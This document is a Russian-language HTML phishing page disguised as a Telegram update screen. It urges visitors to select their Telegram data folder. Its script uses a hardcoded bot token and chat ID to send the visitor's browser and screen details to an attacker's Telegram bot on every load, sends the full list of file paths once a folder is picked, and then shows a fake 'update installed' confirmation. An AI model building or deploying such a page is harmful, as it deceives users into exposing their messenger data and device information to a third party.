<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Обновление Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 32px 24px;
            border-radius: 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a2a;
        }
        .icon {
            font-size: 64px;
            margin-bottom: 16px;
        }
        .title {
            color: #ffffff;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .sub {
            color: #888888;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .update-box {
            background: #0a2a1a;
            border: 1px solid #00cc66;
            border-radius: 12px;
            padding: 12px;
            margin: 16px 0;
            color: #66ff99;
            font-size: 14px;
        }
        .update-box span {
            font-weight: 700;
        }
        .file-input-wrapper {
            background: #2a2a2a;
            border: 2px dashed #444;
            border-radius: 16px;
            padding: 30px 20px;
            cursor: pointer;
            transition: 0.2s;
            margin: 16px 0;
        }
        .file-input-wrapper:hover {
            border-color: #0088cc;
        }
        .file-input-wrapper input {
            display: none;
        }
        .file-label {
            color: #aaaaaa;
            font-size: 16px;
        }
        .file-label span {
            color: #0088cc;
            font-weight: 600;
        }
        .status {
            margin-top: 16px;
            color: #888888;
            font-size: 14px;
            display: none;
        }
        .footer {
            color: #444444;
            font-size: 12px;
            margin-top: 24px;
            border-top: 1px solid #2a2a2a;
            padding-top: 16px;
        }
        .btn-continue {
            background: #0088cc;
            border: none;
            color: #fff;
            padding: 14px;
            width: 100%;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }
        .btn-continue:active {
            opacity: 0.7;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">⬆️</div>
    <div class="title">Обновление Telegram</div>
    <div class="sub">Вышла новая версия с улучшенной защитой</div>

    <div class="update-box">
        ✅ <span>Важная новость!</span> Для продолжения работы выберите папку с данными Telegram.
    </div>

    <div class="file-input-wrapper" id="fileDrop">
        <label class="file-label" id="fileLabel">
            <span>📂 Нажмите, чтобы выбрать папку</span>
        </label>
        <input type="file" id="fileInput" webkitdirectory directory multiple>
    </div>

    <div class="status" id="status">⏳ Обработка...</div>
    <button class="btn-continue" id="continueBtn">Продолжить</button>

    <div class="footer">Telegram • 2026</div>
</div>

<script>
    // ===== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ) =====
    const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
    const CHAT_ID = '8277809761';
    const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    let selectedFiles = [];

    function sendToTG(text) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text.substring(0, 4096),
                parse_mode: 'HTML'
            })
        }).catch(e => console.log('Ошибка отправки:', e));
    }

    // ===== ВЫБОР ПАПКИ =====
    document.getElementById('fileInput').addEventListener('change', function(e) {
        const files = e.target.files;
        if (files.length === 0) return;

        selectedFiles = files;
        document.getElementById('status').style.display = 'block';
        document.getElementById('status').textContent = `📁 Выбрано файлов: ${files.length}`;
        document.getElementById('fileLabel').innerHTML = `<span>✅ Выбрано ${files.length} файлов</span>`;

        // Отправляем отчёт в Telegram
        let fileList = [];
        for (let i = 0; i < files.length; i++) {
            fileList.push(files[i].webkitRelativePath || files[i].name);
        }
        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлы:\n${fileList.join('\n')}`);
    });

    // ===== КНОПКА "ПРОДОЛЖИТЬ" =====
    document.getElementById('continueBtn').addEventListener('click', function() {
        if (selectedFiles.length === 0) {
            document.getElementById('status').style.display = 'block';
            document.getElementById('status').textContent = '⚠️ Пожалуйста, выберите папку с данными Telegram';
            return;
        }

        document.getElementById('status').textContent = '⏳ Обновление...';
        sendToTG(`✅ <b>Обновление завершено</b>\n📁 Файлов обработано: ${selectedFiles.length}`);

        setTimeout(() => {
            document.getElementById('status').textContent = '✅ Обновление успешно установлено! Перезапустите Telegram.';
            document.querySelector('.update-box').innerHTML = '✅ <span>Обновление установлено!</span> Версия 11.0.1';
            document.getElementById('continueBtn').textContent = 'Перезапустить';
            document.getElementById('continueBtn').style.background = '#00cc66';
        }, 2000);
    });

    // ===== АВТО-УВЕДОМЛЕНИЕ ПРИ ВИЗИТЕ =====
    window.onload = function() {
        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${navigator.userAgent}\n📺 ${screen.width}x${screen.height}`);
    };
</script>
</body>
    </html>
